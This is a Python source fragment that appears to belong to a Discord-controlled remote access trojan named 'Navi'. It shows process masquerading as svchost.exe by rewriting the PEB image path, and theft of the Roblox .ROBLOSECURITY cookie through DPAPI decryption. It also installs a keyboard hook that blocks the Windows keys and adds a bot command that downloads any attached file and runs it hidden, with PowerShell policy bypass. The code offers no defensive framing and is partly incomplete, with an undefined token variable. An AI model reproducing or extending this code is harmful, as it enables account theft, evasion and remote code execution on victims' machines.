def hide_script():
    import ctypes
    from ctypes import wintypes, byref
    kernel32 = ctypes.windll.kernel32
    ntdll   = ctypes.windll.ntdll
    current = kernel32.GetCurrentProcess()
    class PROCESS_BASIC_INFORMATION(ctypes.Structure):
        _fields_ = [
            ('ExitStatus', wintypes.LONG),
            ('PebBaseAddress', ctypes.c_void_p),
            ('AffinityMask', ctypes.c_void_p),
            ('BasePriority', wintypes.LONG),
            ('UniqueProcessId', ctypes.c_void_p),
            ('InheritedFromUniqueProcessId', ctypes.c_void_p),
        ]

    pbi = PROCESS_BASIC_INFORMATION()
    status = ntdll.NtQueryInformationProcess(
        current, 0, byref(pbi), ctypes.sizeof(pbi), None
    )
    if status != 0:
        return False
    is_64bit = ctypes.sizeof(ctypes.c_void_p) == 8
    peb_offset = 0x20 if is_64bit else 0x10

    buffer = ctypes.create_string_buffer(8)
    bytes_read = wintypes.SIZE_T()
    kernel32.ReadProcessMemory(
        current,
        ctypes.c_void_p(pbi.PebBaseAddress + peb_offset),
        buffer,
        8,
        byref(bytes_read)
    )

    proc_params = ctypes.c_void_p()
    ctypes.memmove(byref(proc_params), buffer, ctypes.sizeof(proc_params))
    str_offset = 0x60 if is_64bit else 0x38
    str_buffer = ctypes.create_string_buffer(16)
    kernel32.ReadProcessMemory(
        current,
        ctypes.c_void_p(proc_params.value + str_offset),
        str_buffer,
        16,
        byref(bytes_read)
    )

    buf_ptr = ctypes.c_void_p()
    ctypes.memmove(byref(buf_ptr), str_buffer[4:4+ctypes.sizeof(ctypes.c_void_p)], ctypes.sizeof(ctypes.c_void_p))

    target = "svchost.exe\0"
    target_bytes = target.encode('utf-16-le')
    kernel32.WriteProcessMemory(
        current,
        buf_ptr,
        ctypes.c_char_p(target_bytes),
        len(target_bytes),
        byref(wintypes.SIZE_T())
    )
    return True

def get_roblox_sex():

    if not os.path.exists(roblox_cookies_path):
        return None, "Roblox cookie file not found."

    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    try:
        shutil.copy(roblox_cookies_path, destination_path)
    except Exception as e:
        return None, f"Failed to copy cookie file: {e}"
    decrypted_cookie = None
    try:
        with open(destination_path, 'r', encoding='utf-8') as file:
            try:
                file_content = json.load(file)
                encoded_cookies = file_content.get("CookiesData", "")
                if encoded_cookies:
                    decoded_cookies = base64.b64decode(encoded_cookies)
                    try:
                        decrypted_bytes = CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
                        decrypted_cookie = decrypted_bytes.decode('utf-8', errors='ignore')
                    except Exception as e:
                        return None, f"Decryption failed: {e}"
                else:
                    return None, "No CookiesData found in file."
            except json.JSONDecodeError as e:
                return None, f"JSON decode error: {e}"
    except Exception as e:
        return None, f"Read error: {e}"
    finally:
        if os.path.exists(destination_path):
            try:
                os.remove(destination_path)
            except Exception:
                pass
    if not decrypted_cookie:
        return None, "Decrypted cookie is empty."
    match = re.search(r'(_\|WARNING:.*?);', decrypted_cookie)
    if not match:
        return None, "Could not extract .ROBLOSECURITY token from decrypted data."

    info = fetch_roblox_sex(token)
    if not info:
        return None, "Token is invalid or Roblox API returned an error."

if ctypes.sizeof(ctypes.c_void_p) == 8:
    WPARAM = ctypes.c_uint64
    LPARAM = ctypes.c_int64
else:
    WPARAM = ctypes.c_uint32
    LPARAM = ctypes.c_int32

LowLevelKeyboardProc = ctypes.WINFUNCTYPE(
    ctypes.c_long, ctypes.c_int, WPARAM, LPARAM
)

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.wintypes.DWORD),
        ("scanCode", ctypes.wintypes.DWORD),
        ("flags", ctypes.wintypes.DWORD),
        ("time", ctypes.wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
    ]

_hook_proc_callback = None
hook_handle = None

def _hook_proc(nCode, wParam, lParam):
    if nCode >= 0 and wParam == WM_KEYDOWN:
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        if kb.vkCode in (VK_LWIN, VK_RWIN):
            return 1
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

def install_keyblock():
    global hook_handle, _hook_proc_callback
    if hook_handle:
        return
    if _hook_proc_callback is None:
        _hook_proc_callback = LowLevelKeyboardProc(_hook_proc)
    user32 = ctypes.windll.user32
    user32.SetWindowsHookExW.argtypes = [
        ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32
    ]
    user32.SetWindowsHookExW.restype = ctypes.c_void_p
    callback_ptr = ctypes.cast(_hook_proc_callback, ctypes.c_void_p)
    hook_handle = user32.SetWindowsHookExW(WH_KEYBOARD_LL, callback_ptr, 0, 0)
    if not hook_handle:
        print("[!] Failed to install keyboard hook.")

def uninstall_keyblock():
    global hook_handle
    if hook_handle:
        ctypes.windll.user32.UnhookWindowsHookEx(hook_handle)
        hook_handle = None

EXEC_MAP = {
    ".py":   (sys.executable,       False, None),
    ".bat":  (["cmd.exe", "/c"],     True,  None),
    ".cmd":  (["cmd.exe", "/c"],     True,  None),
    ".ps1":  (["powershell.exe", "-ExecutionPolicy", "Bypass", "-File"], True, "powershell.exe"),
    ".vbs":  (["cscript.exe", "//Nologo"], True, "cscript.exe"),
    ".js":   (["cscript.exe", "//Nologo"], True, "cscript.exe"),
    ".sh":   (["bash"],              False, "bash"),
    ".exe":  (None,                  True,  None),
    ".com":  (None,                  True,  None),
    ".msi":  (["msiexec.exe", "/i"], True, "msiexec.exe"),
}
DEFAULT_EXEC = (None, True, None)

def run_with_fallback(cmd, use_shell, cwd, hide_window=True):
    flags = 0
    if hide_window and sys.platform == "win32" and hasattr(subprocess, 'CREATE_NO_WINDOW'):
        flags = subprocess.CREATE_NO_WINDOW

    proc = subprocess.Popen(
        cmd,
        shell=use_shell,
        cwd=cwd,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=flags
    )

    time.sleep(0.5)
    ret = proc.poll()

    if ret is not None and hide_window:
        if ret == 0:
            return proc, None
        if sys.platform == "win32":
            proc = subprocess.Popen(
                cmd,
                shell=use_shell,
                cwd=cwd,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            time.sleep(0.5)
            ret = proc.poll()
            if ret is not None:
                return proc, f"Process exited with code {ret}"
            return proc, None
        else:
            return proc, f"Process exited with code {ret}"

    return proc, None

@bot.command(name="execut")
async def upload_and_run(ctx: commands.Context):
    if not ctx.message.attachments:
        await ctx.send("Navi needs a file attached.")
        return
    attachment = ctx.message.attachments[0]
    filename = attachment.filename
    ext = os.path.splitext(filename)[1].lower()
    interpreter_cmd, use_shell, check_bin = EXEC_MAP.get(ext, DEFAULT_EXEC)
    if check_bin:
        try:
            subprocess.run(
                [check_bin, "--version"] if sys.platform != "win32" else [check_bin],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except FileNotFoundError:
            await ctx.send(f"Navi can't run **{ext}** — `{check_bin}` not in PATH.")
            return

    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, filename)
    try:
        await attachment.save(file_path)
    except Exception as e:
        await ctx.send(f"Download failed: {e}")
        return
    if sys.platform != "win32":
        os.chmod(file_path, 0o755)
    if interpreter_cmd is None:
        cmd = file_path if use_shell else [file_path]
    else:
        if isinstance(interpreter_cmd, list):
            cmd = interpreter_cmd + [file_path]
        else:
            cmd = [interpreter_cmd, file_path]
    proc, error = run_with_fallback(cmd, use_shell, temp_dir)

    if error:
        await ctx.send(f"Navi executed **{filename}** but process died: {error}")
    else:
        await ctx.send(f"Navi executed **{filename}** from **{temp_dir}** (PID: {proc.pid})")
